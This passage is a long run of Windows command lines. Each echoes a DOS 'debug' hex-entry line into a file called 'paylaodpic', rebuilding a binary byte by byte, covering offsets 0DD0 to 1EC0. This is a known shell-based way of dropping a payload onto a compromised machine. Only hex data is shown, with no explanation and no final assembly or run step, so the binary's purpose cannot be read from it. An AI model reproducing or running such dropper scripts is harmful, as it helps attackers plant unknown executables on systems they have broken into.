echo e 0DD0  20 C7 A7 5E 56 26 66 B4 E7 54 86 B7 85 8E 87 67>>paylaodpic
echo e 0DE0  3A 08 7D 50 08 77 59 15 50 79 16 7D 1D C8 20 62>>paylaodpic
echo e 0DF0  76 80 42 A8 56 20 68 86 1A E8 7D A5 47 2C A3 47>>paylaodpic
echo e 0E00  87 C1 C2 86 84 F7 52 AB 17 87 69 75 68 85 7A 97>>paylaodpic
echo e 0E10  68 83 02 50 2A 68 7A 01 B8 6A 2C 36 52 F5 75 60>>paylaodpic
echo e 0E20  77 C8 27 F5 57 7C 0A A6 79 25 68 7E 0D B2 86 4E>>paylaodpic
echo e 0E30  B2 78 37 D5 6A 78 A7 6B 9A 03 87 83 F8 57 1F 08>>paylaodpic
echo e 0E40  4B 76 C8 88 78 C8 50 3D C8 76 36 45 6B 13 62 76>>paylaodpic
echo e 0E50  FB A1 8A ED 41 74 08 E2 8A 02 02 8B 06 22 8B 00>>paylaodpic
echo e 0E60  42 8B 45 E7 7E 23 97 8B BA B8 8B BC D8 8B BE F8>>paylaodpic
echo e 0E70  8B C0 18 8C C2 38 8C C4 58 8C C6 78 8C C8 98 8C>>paylaodpic
echo e 0E80  CA FF B8 8C CC D8 8C CE F8 8C D0 18 8D D2 38 8D>>paylaodpic
echo e 0E90  D4 58 8D D6 D8 13 10 90 8D D9 98 10 DA C8 14 DA>>paylaodpic
echo e 0EA0  F8 8D 26 F1 8D DD C8 10 E2 B8 8D 03 51 8E 10 E0>>paylaodpic
echo e 0EB0  4D E8 38 8E E1 88 8E 0F 21 8E DC 68 8E 4A E1 8E>>paylaodpic
echo e 0EC0  12 B1 8E EC 58 10 F4 A8 10 F6 78 8E E5 A8 8E F6>>paylaodpic
echo e 0ED0  28 8F 23 B1 8E 11 71 8F F8 08 90 48 41 90 F5 F8>>paylaodpic
echo e 0EE0  8F 06 59 90 E9 A8 8F 00 89 90 00 00 91 43 72 8F>>paylaodpic
echo e 0EF0  E0 88 12 F0 F8 8E 0B 29 15 12 39 90 06 B9 91 11>>paylaodpic
echo e 0F00  99 91 04 E1 91 21 09 92 42 42 90 22 E9 11 17 E9>>paylaodpic
echo e 0F10  10 27 E9 8D 24 09 11 08 B9 91 22 B9 92 1F D9 90>>paylaodpic
echo e 0F20  FE 48 93 02 C1 8E F4 98 8F 09 99 8E 2D 09 8F 26>>paylaodpic
echo e 0F30  D9 8F 0E 59 91 23 39 8E 29 C9 90 DB D8 92 18 69>>paylaodpic
echo e 0F40  93 46 69 8E 42 39 93 06 01 93 20 A9 90 4A C9 8F>>paylaodpic
echo e 0F50  53 49 24 3F 49 93 39 09 94 13 D1 8D 10 A9 90 4B>>paylaodpic
echo e 0F60  49 92 FF 38 94 4C D9 94 54 A9 95 16 01 95 E0 A8>>paylaodpic
echo e 0F70  95 2F 09 96 51 E9 95 07 21 93 3C 42 91 57 F9 94>>paylaodpic
echo e 0F80  48 B3 B9 10 44 B9 90 42 59 94 0C 89 10 4D 49 96>>paylaodpic
echo e 0F90  72 39 95 7F 99 11 27 09 94 F2 F8 97 55 49 95 76>>paylaodpic
echo e 0FA0  59 97 37 A9 98 3D 12 96 74 A9 94 70 F9 96 85 09>>paylaodpic
echo e 0FB0  98 1D 89 96 7C 89 97 95 69 93 6B 09 99 87 C9 91>>paylaodpic
echo e 0FC0  9D 59 96 58 19 9A 02 19 94 89 F9 99 43 09 4E 6E>>paylaodpic
echo e 0FD0  79 9A 88 79 96 9A F9 90 19 69 99 8F 79 99 AD 39>>paylaodpic
echo e 0FE0  9B 8F 19 99 0D 31 98 3D 39 9A A4 B9 9B E4 C8 98>>paylaodpic
echo e 0FF0  71 99 99 94 29 9A AC A9 9B 4E 19 9B B2 29 99 87>>paylaodpic
echo e 1000  19 98 AB F9 95 BE 59 9A BD F9 99 38 19 93 48 29>>paylaodpic
echo e 1010  93 B6 99 23 9B 49 99 8B 69 9A CF A9 9B 5D C9 96>>paylaodpic
echo e 1020  55 29 91 CA 99 9D F1 A8 97 14 81 9B D0 99 99 BC>>paylaodpic
echo e 1030  79 9C B7 D9 9C DB 3A D2 9D C1 59 9C E5 89 99 C2>>paylaodpic
echo e 1040  69 9C C8 59 9F F6 29 9E CB 19 94 DA F9 9C FC 39>>paylaodpic
echo e 1050  9E 7B E9 9F E9 19 A0 45 E2 9E C8 C9 9E F4 B9 9C>>paylaodpic
echo e 1060  7E 09 9B 07 8A 9F F9 39 97 FF 39 9C FD A9 9E AA>>paylaodpic
echo e 1070  79 9F 12 EA 9C DF 74 9D 05 7A 11 E0 39 99 1C EA>>paylaodpic
echo e 1080  9D B2 39 9B 9C 29 9A 21 0A A2 18 61 9E 02 AA A0>>paylaodpic
echo e 1090  15 2A A0 25 29 95 9D 59 9D A0 E9 9A 17 C9 A2 D9>>paylaodpic
echo e 10A0  E9 98 33 6A 96 2F 9A 92 A9 09 A1 05 BA 8F 33 59>>paylaodpic
echo e 10B0  94 15 29 A3 3D CA A3 0B 3A 91 52 09 A0 F1 E9 A3>>paylaodpic
echo e 10C0  66 E9 93 3F 5A A4 5F A9 9F 41 CA 8F 41 BA 9F 2A>>paylaodpic
echo e 10D0  D9 96 6E 49 9C 4B 5A A5 4C 3A A4 EE E4 A2 7A C1>>paylaodpic
echo e 10E0  A5 39 E1 A5 35 E9 18 3A 19 14 63 BA A5 06 CA 17>>paylaodpic
echo e 10F0  65 FA 13 69 7A 4E 39 7A 8D 5C D1 A6 6E 1A A7 72>>paylaodpic
echo e 1100  3A A7 74 5A A7 76 7A A7 78 9A A7 7A BA A7 7C DA>>paylaodpic
echo e 1110  A7 FF 7E FA A7 80 1A A8 82 3A A8 1F 17 00 01 50>>paylaodpic
echo e 1120  21 86 8A 12 86 BA A8 3D B1 A8 89 3A 11 8E AA 11>>paylaodpic
echo e 1130  8E 7A A8 08 31 A9 94 0A 00 91 BA 11 8C BA 10 8F>>paylaodpic
echo e 1140  3A 10 93 0A A9 97 6A 10 99 1A 11 9D 5A 10 A5 CA>>paylaodpic
echo e 1150  11 A3 7A 11 9F 5A A9 AB 8A A9 9B 5A 18 8C 7A AA>>paylaodpic
echo e 1160  20 21 AB 22 D1 AA 3A 61 AB 10 91 AA 9C 6A A9 04>>paylaodpic
echo e 1170  81 AB 9E CA AB 02 A1 AB AA 4A AB A6 1A AA AE FA>>paylaodpic
echo e 1180  AA B9 6A AC BF 2A AC 0A 61 A9 C6 4A AC 18 C1 AC>>paylaodpic
echo e 1190  AC 6A AB BE 1A AC C0 7A AC CA FA 17 CE 9A AD 1E>>paylaodpic
echo e 11A0  01 AD B5 CA AD 38 E1 AD CD 0A AE D3 EA AB C4 EA>>paylaodpic
echo e 11B0  AD E2 2A 11 E9 3A AE A0 CA AA D6 FA 10 DB 5A AC>>paylaodpic
echo e 11C0  B3 4A AE 07 11 AF F2 5A AF E4 BA AE 78 D1 A9 9B>>paylaodpic
echo e 11D0  1A A9 C8 8A AD CA 4A AD CE 2A AA B8 FA AF D6 6A>>paylaodpic
echo e 11E0  B0 AE 5A AE 87 1A AA AD 1A AB 06 2B B0 97 FA AF>>paylaodpic
echo e 11F0  FA 4A B0 04 9B A8 C8 CA AF A7 2A AB F6 DA AB F4>>paylaodpic
echo e 1200  5A AC 0B 2B B1 1F 5B AA D5 9A B0 F8 7A B1 03 FB>>paylaodpic
echo e 1210  AE FF BF EA B1 22 CB B0 11 7B B2 CB BA B2 16 AB>>paylaodpic
echo e 1220  B1 01 EB B0 2C BB AC F7 CA B1 D7 9A B2 83 91 B1>>paylaodpic
echo e 1230  94 BA AD 2D 0B B1 A3 BA B1 00 0B B2 33 6B AE D9>>paylaodpic
echo e 1240  BA B1 27 EB B3 38 1B B4 18 FB AC 1D EB AE 2A DB>>paylaodpic
echo e 1250  B0 35 CB B1 15 6B B4 C9 EA B2 43 DB B4 E7 7A B4>>paylaodpic
echo e 1260  D7 8A B4 53 7B B0 4C 9B 10 42 EB B2 4A 4B B5 51>>paylaodpic
echo e 1270  1B B6 3A 9B B6 2F 2B AC 13 5B 17 E2 DA AF 3D EB>>paylaodpic
echo e 1280  B4 28 AB B6 5B 6B B6 36 CB AE 37 7B B7 28 FB AA>>paylaodpic
echo e 1290  70 FB B3 50 3B B7 24 AB B6 C9 3A AD 73 DB B4 79>>paylaodpic
echo e 12A0  6B B7 F8 4A AA 86 7B B0 82 1B B8 87 EB B8 8E 4B>>paylaodpic
echo e 12B0  AB 2B 2B B6 2C 8B B0 92 2B B7 77 CB B3 84 1B B8>>paylaodpic
echo e 12C0  8B DB B8 80 4B B1 3B 1B B7 68 7B B6 7D 9B B3 5B>>paylaodpic
echo e 12D0  DB B6 6B 3B B3 A0 AB B3 9A 0B B9 30 6B B2 88 0B>>paylaodpic
echo e 12E0  B9 F0 CA AD A7 CB B6 B4 9B AF 4F 1B BB 18 1B BB>>paylaodpic
echo e 12F0  B2 FB B9 59 3B B9 AB EB BA 46 0B B2 25 6B BA B8>>paylaodpic
echo e 1300  FB B7 A4 1B BC BC BB BC 7D F1 A8 5D CB B5 49 3B>>paylaodpic
echo e 1310  B6 FF E0 9A B3 BB 6A B5 8F 2B B8 CE 8B B9 59 8B>>paylaodpic
echo e 1320  B8 AD AB AE B7 AB B0 5C 8B BC CA CB 10 DD 0B BC>>paylaodpic
echo e 1330  CC 2B B3 58 7B B9 DC FB BC BA 0B BD C6 8B B7 E3>>paylaodpic
echo e 1340  0B B6 EA 9B B8 94 4B 18 DD DB BB D0 FA B6 1D 2B>>paylaodpic
echo e 1350  AD 1E DB B8 32 5B BF 66 DB BA 7C FB B5 C2 4B 11>>paylaodpic
echo e 1360  75 4B BF 0F FB BD 00 3C BB 37 6B BE 9E 2B BB FA>>paylaodpic
echo e 1370  4B BF 85 BB BB 80 7B BF 0F 7C C1 BD 9B C1 D9 AB>>paylaodpic
echo e 1380  BA 12 DC C1 81 E1 C0 97 3B B5 B0 9B B6 14 FC B9>>paylaodpic
echo e 1390  C4 CB B8 8F 2B B1 28 7C AC 2B 0C B7 7A CB B9 16>>paylaodpic
echo e 13A0  CC C0 1E 4C C2 31 EC BB CC 6B C2 9D EB C0 36 0C>>paylaodpic
echo e 13B0  C1 20 DC B2 AC FB B5 03 4C BD 14 3C C2 3B BC C3>>paylaodpic
echo e 13C0  07 CC C2 E7 7B BC F6 1B BD C6 FB BC 4D CC B4 42>>paylaodpic
echo e 13D0  CC B3 4C 0C B4 50 5C C5 56 7C C5 34 3B B2 0B 9C>>paylaodpic
echo e 13E0  BA 5A 2B BA BF CB C5 1C 5C A9 55 5B C5 60 2B BF>>paylaodpic
echo e 13F0  A5 9B AA D2 2B B5 68 6C AF 58 6B C6 3F BB AA 42>>paylaodpic
echo e 1400  EB BB 5E DB B7 5F EC C6 61 BC C4 41 5C B0 7A 6C>>paylaodpic
echo e 1410  BB 6C 52 6C B9 E8 1B B2 76 7C B6 51 4B B5 BA EA>>paylaodpic
echo e 1420  AF AF CB C2 71 4C BE 45 AB C6 BB 3B C7 D6 2B C6>>paylaodpic
echo e 1430  F2 BA C6 1B 2C BA 70 DC C6 D4 8B AD 55 9B C9 27>>paylaodpic
echo e 1440  5C BC 63 FC C6 B6 DB C9 5D 9C B2 8E FC C9 FC 81>>paylaodpic
echo e 1450  BA 27 C1 BF 8A 8A B0 72 9C BB 4B 61 CA D1 AA CA>>paylaodpic
echo e 1460  29 81 CA F3 E1 CA 25 21 CB 26 C1 BF E1 8B 15 B4>>paylaodpic
echo e 1470  6C 11 B6 5C CB B0 3C CB BD BC 16 8B CC CA FF 15>>paylaodpic
echo e 1480  A7 C5 76 61 CC 84 9A CC CA BC CC CC DC CC CE 1C>>paylaodpic
echo e 1490  4F BF DC 12 C1 FC CA BB CC CB F4 1A CD B1 8C BA>>paylaodpic
echo e 14A0  7D 3C CC F3 2A A9 D5 5C CD A9 8C CD 83 BC C5 4B>>paylaodpic
echo e 14B0  0B CE 48 61 C8 EB 2A CE 2A 81 C5 A5 8B C9 3E FB>>paylaodpic
echo e 14C0  C6 8A 8B CC E2 5B B1 0D D1 C6 9A 3A C9 98 7C B8>>paylaodpic
echo e 14D0  C3 4B CB 0E 1B BF A0 4A CC FE 6C 13 F2 3C CE F3>>paylaodpic
echo e 14E0  BC BD 5E 81 CE B9 6B CE 1F B1 CD 95 1C B3 0E 6D>>paylaodpic
echo e 14F0  C9 00 9D C8 DE 5C CF F6 3C D1 EE AC CE 45 6C CA>>paylaodpic
echo e 1500  12 8D AA 00 7D BD B7 DA D1 45 0C BF 62 91 BD 63>>paylaodpic
echo e 1510  1C C9 41 9C B9 0F 4D D0 32 FC C3 13 DC D2 24 5B>>paylaodpic
echo e 1520  C3 BB FA C2 7B 1C C2 1F EB 10 9D 0B B0 25 AD B2>>paylaodpic
echo e 1530  30 8C C3 AA 9C BF 1D 9D C3 CC 8A CE 6B 4B C8 79>>paylaodpic
echo e 1540  FC B2 75 3C D4 36 4D B3 2A 2D BF 33 9C D4 C5 EB>>paylaodpic
echo e 1550  B4 51 8C D1 E7 5C D3 C9 0B C6 2D 3C C9 8C 2C D5>>paylaodpic
echo e 1560  05 FC D2 3E 0C BC 24 7D C3 5B DC C5 AF 3B CC EA>>paylaodpic
echo e 1570  6C BE E9 FB C4 61 FB C7 0A DC D4 22 0D C3 FF 09>>paylaodpic
echo e 1580  3C C5 79 9C A9 64 9C C6 C1 5C B6 06 ED C6 01 1D>>paylaodpic
echo e 1590  D3 39 6D D5 5C 6C 15 B6 0C B3 34 6C B7 03 5C D0>>paylaodpic
echo e 15A0  6D FD D5 5A 7B AF 5F 8D C1 7F DB D3 B9 AC B7 65>>paylaodpic
echo e 15B0  ED B7 48 1C D9 0D 0C D4 E8 BA D6 79 CD D6 FA 7C>>paylaodpic
echo e 15C0  D3 82 BD B8 F7 3B BF 8A 8D B3 7B AB BD 29 0C D2>>paylaodpic
echo e 15D0  19 6C C3 9E 1D D2 AD 1C D4 02 BB D9 AC 4D B7 03>>paylaodpic
echo e 15E0  7D C3 34 6D D9 1E 3D AE 33 7D DA 5B AD C8 52 9B>>paylaodpic
echo e 15F0  B7 EC BB D9 B0 7C C4 97 0D BA 51 9C D9 E5 EC C3>>paylaodpic
echo e 1600  AD 7D DB C3 8D D1 B1 2D C9 09 6C C0 4A 7C BD 76>>paylaodpic
echo e 1610  2D 15 89 8D D7 AE 3D DD 15 EC C9 DA 3C BD B9 6C>>paylaodpic
echo e 1620  DB 60 0D BE 55 2D DC DB 9D BA ED DB D7 38 CC D2>>paylaodpic
echo e 1630  6C ED D3 8A 6B C6 DE 4D C3 B9 5D DC 35 FC DC 7A>>paylaodpic
echo e 1640  4D BA 62 7D C7 83 4B CE A6 BD D1 4D B1 C1 8E 4D>>paylaodpic
echo e 1650  C0 25 BC D3 3F 4C DC 2B 1D BF F8 3D DB 1A ED C5>>paylaodpic
echo e 1660  57 ED C1 30 0D DC FB CD D5 FE 5D BE 04 EE D1 E6>>paylaodpic
echo e 1670  3D DF FE 2B DA 0A 1E D8 EB CB C3 98 4D D1 FF 98>>paylaodpic
echo e 1680  3D D8 B3 FD DE 4D AD DD 4E F1 BF 2E 2D D9 66 0D>>paylaodpic
echo e 1690  D9 91 1B B7 2F 8C E1 05 9D E0 A5 5D D9 AB EB C2>>paylaodpic
echo e 16A0  2B DC BE 24 1E E1 28 0D D9 94 9D DF 9E EB DB 1B>>paylaodpic
echo e 16B0  0E E2 AB DC BF 28 5C E3 2F 1E B3 2D DE E0 16 0E>>paylaodpic
echo e 16C0  E0 5E 1D E3 A8 4D DF CB 1B C2 DF 1D 14 8B 5C C6>>paylaodpic
echo e 16D0  65 2B D7 67 8C D0 4E 6E DF 1D 0E B4 65 3C B4 17>>paylaodpic
echo e 16E0  CE CD 88 3C CA 71 5D C8 39 1D E5 D6 DD E5 59 7C>>paylaodpic
echo e 16F0  E5 6C 4C B6 15 ED BE EC CC D7 4A EB DE FB 2C E6>>paylaodpic
echo e 1700  01 0B CA 95 DB D0 C0 4A E5 C7 1D E7 50 8E D6 5A>>paylaodpic
echo e 1710  CD 13 4D DE E3 4A 9D CF 73 9D D2 7E DE E7 4E DD>>paylaodpic
echo e 1720  C9 4B 3B E3 7E DC AC 7B 8D CF 6E 5E E8 2A 4C D0>>paylaodpic
echo e 1730  A1 CC E8 87 3C E6 7C 3E E7 66 7E C9 98 4A B9 26>>paylaodpic
echo e 1740  FB C4 6E 0D C8 92 CE E3 99 2C C8 A2 0A E7 A0 3E>>paylaodpic
echo e 1750  E5 94 5C D7 67 4D E9 51 9D E7 3B A1 D0 8D AA EA>>paylaodpic
echo e 1760  FF 8C DD 35 C1 EA 47 21 EB 84 FD CF DD 4A DA 9F>>paylaodpic
echo e 1770  81 EB 42 31 CD C3 9A BF 02 3D D2 24 21 EB 03 B4>>paylaodpic
echo e 1780  EE A9 FF B4 A1 EB FB FA EB 61 61 EC DC 4D CD BC>>paylaodpic
echo e 1790  5E CF CF 5C BD AC 5E D1 CF 3E ED D4 5E ED D6 7E>>paylaodpic
echo e 17A0  ED D8 7E 19 96 DE D6 1C AD EC 45 D1 EC 2C 51 BB>>paylaodpic
echo e 17B0  DD AE D6 15 31 EC 4A AE 1E D2 8E E4 DE AC EC 74>>paylaodpic
echo e 17C0  0E C6 DE 4E D1 C3 DE CD 9C 7C CF 6F BD CB E6 0E>>paylaodpic
echo e 17D0  BD EB 11 EF 1C CD EC A6 9E EE 1D A1 EF F2 5E EB>>paylaodpic
echo e 17E0  D6 AC EE E1 2E DB E4 E1 C8 22 AE DA 99 9E CF 46>>paylaodpic
echo e 17F0  1D DF C4 FC C7 09 BF BE 0B DF EC 0C 9D F0 F5 1E>>paylaodpic
echo e 1800  D9 42 CD D4 7C BD E4 7B 0D DB 3F 5D C8 80 8E DB>>paylaodpic
echo e 1810  AB 0D F2 E2 9C D5 77 CE CA 68 7D E9 48 CD B8 24>>paylaodpic
echo e 1820  0F F0 57 C1 E5 71 0D CA EE BE F1 ED CE BB 76 0D>>paylaodpic
echo e 1830  E4 F1 3D F3 FF FD BB 60 5E E7 A5 7E F2 8B BE E1>>paylaodpic
echo e 1840  E0 2B DF 1C 5F CE F0 FD B4 74 8D C5 22 1F E6 F8>>paylaodpic
echo e 1850  BC F4 41 7F D7 37 BF ED 70 E1 D3 26 9E DE 13 4C>>paylaodpic
echo e 1860  DC 27 1D E2 83 4E CF 9B 7E CD 95 FB D9 36 5F F5>>paylaodpic
echo e 1870  9E 9D F5 64 7F D3 2C 3E F0 02 8E EB E8 0B F6 46>>paylaodpic
echo e 1880  3C C4 FF 12 2E BE 45 FE DF 01 1E DA 93 8D F5 6F>>paylaodpic
echo e 1890  1F 17 0F 4E CE 51 1F C0 77 3F E0 84 5D AD EF CB>>paylaodpic
echo e 18A0  F6 3B CE D5 E0 3D DE 5B DD D9 CD 7D B5 CB 2D F0>>paylaodpic
echo e 18B0  1C 5E DD 3B 4F DD EE BD C0 10 3F BB 3A 1E DA 66>>paylaodpic
echo e 18C0  CE F7 FE DE 16 79 0F F7 5E CB F7 A3 DD AE E5 4D>>paylaodpic
echo e 18D0  D5 C7 5D E1 8F 6F D8 3F EF DF 74 EF F9 A4 CF F8>>paylaodpic
echo e 18E0  4F 5D F9 42 CF ED 3A CC ED 8E CF F3 5B EF E1 D0>>paylaodpic
echo e 18F0  AE E2 3A 5F E2 76 FC EE 5D B1 F9 06 9E F8 D1 6D>>paylaodpic
echo e 1900  DC 10 EE E0 B7 8B FA B1 0F FB 62 0F C8 5A 4F F8>>paylaodpic
echo e 1910  AA 4F DD AC EF E9 AE 5F F4 E3 7B FC 7F 2F C2 BA>>paylaodpic
echo e 1920  0E E4 9F EE BD C1 0F D6 71 DF BC B0 5E D8 23 8E>>paylaodpic
echo e 1930  F9 32 8D FA 8A 5C FD 8B DD C3 C3 9F FA D8 8F F1>>paylaodpic
echo e 1940  9C DD FE 31 9E E0 67 AF DE 01 6D EF 77 3C B1 25>>paylaodpic
echo e 1950  5C E4 04 1C D3 20 6E FF D6 FF AC 00 01 00 40 00>>paylaodpic
echo e 1960  82 02 05 16 3C 18 C0 E0 40 85 0C 1B 26 5C 18 51>>paylaodpic
echo e 1970  E2 44 8A 15 2D 5E C4 98 51 E3 46 83 04 3D 7A EC>>paylaodpic
echo e 1980  F8 11 AC 64 48 91 0F 4B 22 FC 98 10 E5 C9 86 2C>>paylaodpic
echo e 1990  33 BA 54 29 92 E4 C8 99 32 1D B6 A4 89 11 E1 4C>>paylaodpic
echo e 19A0  87 37 61 FA A4 F9 F3 64 C4 A1 0B 77 4E 7C 58 33>>paylaodpic
echo e 19B0  25 D0 9D 3F 75 16 5D BA F4 A9 CD A8 23 9D 4E 25>>paylaodpic
echo e 19C0  6A 35 67 45 A1 45 99 E2 5C 19 D6 26 47 B2 65 CD>>paylaodpic
echo e 19D0  9E 45 6B D4 AB 53 B6 63 AB 36 05 A9 B5 E4 CB B5>>paylaodpic
echo e 19E0  75 A5 F2 94 0B 36 E9 C5 A3 37 7B C6 05 9C 34 E5>>paylaodpic
echo e 19F0  D1 C1 82 EF F2 94 D8 97 28 D2 C0 31 A5 5E B5 08>>paylaodpic
echo e 1A00  F3 ED DE C8 39 27 2B 25 BB F5 F2 D4 AD 40 B3 3E>>paylaodpic
echo e 1A10  CE 8B 39 ED 68 D2 A5 4D 9F 46 9D 5A F5 6A AE 9D>>paylaodpic
echo e 1A20  4F 2B 0E 59 FA B0 5A D6 B5 6D DF C6 9D 5B F7 FF>>paylaodpic
echo e 1A30  6E DE BD 7D FF CE 3D FB 35 E5 D8 A4 85 1F 04 9E>>paylaodpic
echo e 1A40  5C F9 72 E6 CD 9D 3F 87 1E FD F6 5C B5 C7 57 13>>paylaodpic
echo e 1A50  97 9E 5D FB 76 EE DD BD 7F 8F 3E B6 26 78 F2 E5>>paylaodpic
echo e 1A60  CD 9F 47 9F 5E FD 7A F6 ED DD BF 87 1F 5F FE 7C>>paylaodpic
echo e 1A70  FA F5 ED DF C7 9F 5F FF 7E FE FD FD FF 07 30 40>>paylaodpic
echo e 1A80  01 07 24 B0 40 03 0F 44 30 41 05 17 64 B0 41 07>>paylaodpic
echo e 1A90  1F 84 30 42 09 27 A4 B0 42 0B 2F C4 30 43 0D 37>>paylaodpic
echo e 1AA0  E4 B0 43 0F 3F 04 31 44 11 47 24 B1 44 13 4F 44>>paylaodpic
echo e 1AB0  31 45 15 57 64 B1 45 17 5F 84 31 46 19 67 A4 51>>paylaodpic
echo e 1AC0  39 06 6E C4 91 01 B2 70 CC EE C6 D4 72 5C 08 48>>paylaodpic
echo e 1AD0  8C 7C 34 88 C7 B3 8C 4C 8B 48 8B 84 B4 2D 47 22>>paylaodpic
echo e 1AE0  9D D4 71 47 24 29 9A B2 B6 2A 6F 53 52 BB 2B 39>>paylaodpic
echo e 1AF0  62 F2 41 25 A3 E4 12 4C E8 B2 3C 8D 4C 00 CC 9C>>paylaodpic
echo e 1B00  88 4C 34 37 5A 93 B5 36 7F 14 53 47 1F C5 0C 73>>paylaodpic
echo e 1B10  48 3A AD BC B3 C0 37 35 DA F3 C0 39 CF 3C 73 CE>>paylaodpic
echo e 1B20  2F 85 14 34 4F 81 80 34 92 D0 42 8B EC 52 22 9D>>paylaodpic
echo e 1B30  27 83 AC 52 CD 48 EF EC F3 D1 43 BB 6C D4 51 39>>paylaodpic
echo e 1B40  C1 E4 71 50 4F 39 B5 94 D1 88 30 65 32 D4 8A B2>>paylaodpic
echo e 1B50  DC 14 D0 25 49 65 74 D3 28 05 3D 15 4A 50 0B B5>>paylaodpic
echo e 1B60  14 D6 56 67 0D F4 D2 4C 21 FD B4 4D 59 5D 75 75>>paylaodpic
echo e 1B70  55 24 6B 25 15 D5 49 25 64 35 57 65 55 B5 35 D6>>paylaodpic
echo e 1B80  4B 9F 55 F6 C9 57 A7 BD 48 52 68 AF 1D 35 4E 4A>>paylaodpic
echo e 1B90  0D CD B6 DB 68 A9 8D 35 55 5D 55 85 B4 5C 51 97>>paylaodpic
echo e 1BA0  45 57 5A 68 D5 45 97 CA 6D ED 2C D2 DC 75 A7 15>>paylaodpic
echo e 1BB0  37 CD 54 6D 85 35 5F 7C C1 0D 54 CE 43 B1 75 F6>>paylaodpic
echo e 1BC0  5C 5F EF 15 F7 4D 76 BF 9C 37 E1 6F E5 FF F5 D2>>paylaodpic
echo e 1BD0  5F 81 F9 A5 97 5B 51 07 55 58 DA 3E DB 65 37 5C>>paylaodpic
echo e 1BE0  63 35 CD C8 DA 6F 77 7D F8 5C 5E 37 0E 59 E4 7E>>paylaodpic
echo e 1BF0  13 9D 12 64 8E BD 5D 35 5E 93 0F E6 97 63 7D 11>>paylaodpic
echo e 1C00  25 78 E1 93 29 5E 19 DE 92 ED CD 55 DF 6A 53 E6>>paylaodpic
echo e 1C10  B4 62 70 33 6E B7 41 33 61 D6 74 CB 51 97 45 3A>>paylaodpic
echo e 1C20  5D A5 4D B6 D9 5D 6C 8F 96 18 EA A6 75 C6 79 67>>paylaodpic
echo e 1C30  A7 A7 D6 D6 5D 63 2B 7D F7 67 A9 4B 26 BA 5B 9F>>paylaodpic
echo e 1C40  CB 3D BB 6C 80 8B 0E 58 61 9E F1 65 3B E9 98 85>>paylaodpic
echo e 1C50  A6 1B 6A A3 C3 CE 78 E8 AA 81 AE 5B 6D 6F F5 66>>paylaodpic
echo e 1C60  98 68 AA 3B 7E B5 6E 72 ED AD D7 63 92 DD DE FA>>paylaodpic
echo e 1C70  5F 9B FD 66 D9 EE 9C BB 26 BB 59 99 6B FE D7 E7>>paylaodpic
echo e 1C80  4E 21 B6 3A 68 B1 B5 36 BB 60 B0 DD 06 FC F1 98>>paylaodpic
echo e 1C90  2F 26 D0 D4 9B 23 1E B7 DF CF 6F 1D 99 D6 AA 5B>>paylaodpic
echo e 1CA0  D7 95 4E 49 7F C5 FD E9 D6 51 66 3D 5C A6 8B DD>>paylaodpic
echo e 1CB0  9C E6 88 65 AD FD D6 59 F7 84 12 F6 9F 2D 26 96>>paylaodpic
echo e 1CC0  F8 81 09 06 D6 75 D9 9D EE D5 78 89 93 FF E7 1D>>paylaodpic
echo e 1CD0  F1 9E 21 8F 7D E4 DD 99 F7 7E 75 D4 55 1C BF 46>>paylaodpic
echo e 1CE0  F3 C1 2B FF FC DF 54 57 BF 7D F2 D8 77 3F 7E F9>>paylaodpic
echo e 1CF0  E7 A7 BF 7E FB EF C7 3F 7F FD F7 E7 BF 7F FF FF>>paylaodpic
echo e 1D00  07 60 00 05 38 40 02 16 10 43 B3 73 13 D0 90 97>>paylaodpic
echo e 1D10  3E D4 E8 CE 3B 2A 7B 0E 04 0D F8 22 06 36 30 6C>>paylaodpic
echo e 1D20  2D 4B 4E 05 A3 A3 41 DF 70 70 82 23 D2 D6 A2 4E>>paylaodpic
echo e 1D30  36 2E 07 36 6A 70 62 0B 9E 02 A3 B7 2B E1 01 2B>>paylaodpic
echo e 1D40  84 D7 0B 5E F1 A4 F7 BC 8F 61 0C 81 A5 6A 96 04>>paylaodpic
echo e 1D50  31 C8 B0 0F CA 48 71 A5 E3 5E E4 4E D8 32 9C 21>>paylaodpic
echo e 1D60  ED 4F 03 03 54 D3 82 A8 C4 D2 79 AD 86 8B 23 5C>>paylaodpic
echo e 1D70  AB 98 35 37 36 5D 30 3A 10 C0 E2 42 B2 98 1B 2C>>paylaodpic
echo e 1D80  6E 71 22 5D EC A2 41 C0 28 91 31 02 A0 8C 17 39>>paylaodpic
echo e 1D90  A3 19 C3 28 C6 35 0A 24 8D 16 81 40 46 E2 B8 20>>paylaodpic
echo e 1DA0  6B 15 B1 89 5E 83 E2 DA E4 66 2E 23 FA 0B 89 A2>>paylaodpic
echo e 1DB0  33 DC DB 40 15 C8 95 5D 2D 6E D9 1A 96 ED E0 87>>paylaodpic
echo e 1DC0  16 0F DE C6 8B BD 79 24 45 B6 F8 C8 48 FF 46 D2>>paylaodpic
echo e 1DD0  8D 73 84 E3 1C 27 A9 49 4E 5E D2 93 6A C4 88 25>>paylaodpic
echo e 1DE0  BF 88 49 04 1D ED 77 84 FC 1B E5 78 88 38 3B D2>>paylaodpic
echo e 1DF0  6D 81 A7 34 5D B5 60 69 C8 42 DE 71 74 B0 94 5C>>paylaodpic
echo e 1E00  69 1A 39 9A 34 66 71 93 95 5C 63 18 DB 08 46 52>>paylaodpic
echo e 1E10  4A 92 94 C2 EC 24 28 D9 C8 46 62 6A B1 98 A3 FC>>paylaodpic
echo e 1E20  E4 26 A3 99 4C 51 46 E4 99 CD 14 23 1D B7 45 39>>paylaodpic
echo e 1E30  5A A6 72 95 B7 64 62 C2 5E D9 CA A8 39 B1 72 7A>>paylaodpic
echo e 1E40  94 A2 C5 1A 87 C1 AC 5D 4B 95 76 1B A2 72 A4 D9>>paylaodpic
echo e 1E50  46 65 4E D3 9E CA AC A6 33 AD E9 CB 7B 7E 72 99>>paylaodpic
echo e 1E60  64 7C 66 26 EF 29 CD 7D A2 B1 98 5E 3C 66 40 53>>paylaodpic
echo e 1E70  C7 B3 F0 D5 CE 60 B9 83 A8 39 93 E7 BA 11 3E 6B>>paylaodpic
echo e 1E80  9C F4 FA DE C5 6E F7 C2 3F 0E 92 79 10 C4 1E F0>>paylaodpic
echo e 1E90  22 B7 B6 78 FA 06 9B 04 F5 27 3E A9 C9 C9 7C 16>>paylaodpic
echo e 1EA0  54 9F CE A4 67 3D 53 FA 4F 39 62 92 A0 28 9D 29>>paylaodpic
echo e 1EB0  34 5F 6A C6 9D 96 52 91 2B DA E5 48 0F F9 3E 04>>paylaodpic
echo e 1EC0  B2 E6 A6 C9 4C E9 51 93 1A 53 9D D2 D4 0E 93 C0>>paylaodpic
